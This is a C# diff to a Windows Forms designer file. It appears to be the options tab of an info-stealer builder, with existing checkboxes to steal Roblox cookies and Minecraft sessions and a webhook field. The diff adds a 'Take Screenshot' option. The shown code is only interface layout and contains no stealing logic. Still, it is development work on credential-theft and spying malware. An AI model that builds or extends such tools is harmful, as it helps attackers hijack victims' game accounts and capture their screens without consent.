@@ -39,6 +39,7 @@
             this.StealRobloxCookiesCheckBox = new System.Windows.Forms.CheckBox();
             this.StealMinecraftSessionCheckBox = new System.Windows.Forms.CheckBox();
             this.label1 = new System.Windows.Forms.Label();
+            this.TakeScreenshotCheckBox = new System.Windows.Forms.CheckBox();
             this.SuspendLayout();
             // 
             // webhookLabel
@@ -187,11 +188,25 @@
             this.label1.Size = new System.Drawing.Size(1, 225);
             this.label1.TabIndex = 10;
             // 
+            // TakeScreenshotCheckBox
+            // 
+            this.TakeScreenshotCheckBox.AutoSize = true;
+            this.TakeScreenshotCheckBox.Font = new System.Drawing.Font("Microsoft Sans Serif", 11.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.TakeScreenshotCheckBox.ForeColor = System.Drawing.SystemColors.Control;
+            this.TakeScreenshotCheckBox.Location = new System.Drawing.Point(307, 359);
+            this.TakeScreenshotCheckBox.Name = "TakeScreenshotCheckBox";
+            this.TakeScreenshotCheckBox.Size = new System.Drawing.Size(140, 22);
+            this.TakeScreenshotCheckBox.TabIndex = 11;
+            this.TakeScreenshotCheckBox.Text = "Take Screenshot";
+            this.TakeScreenshotCheckBox.UseVisualStyleBackColor = true;
+            this.TakeScreenshotCheckBox.CheckedChanged += new System.EventHandler(this.CheckBox_CheckChanged);
+            // 
             // GeneralTab
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
             this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(31)))), ((int)(((byte)(31)))), ((int)(((byte)(31)))));
+            this.Controls.Add(this.TakeScreenshotCheckBox);
             this.Controls.Add(this.label1);
             this.Controls.Add(this.StealMinecraftSessionCheckBox);
             this.Controls.Add(this.StealRobloxCookiesCheckBox);
@@ -225,5 +240,6 @@
         private System.Windows.Forms.CheckBox StealMinecraftSessionCheckBox;
         private System.Windows.Forms.CheckBox PingCheckBox;
         private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.CheckBox TakeScreenshotCheckBox;
     }
 }
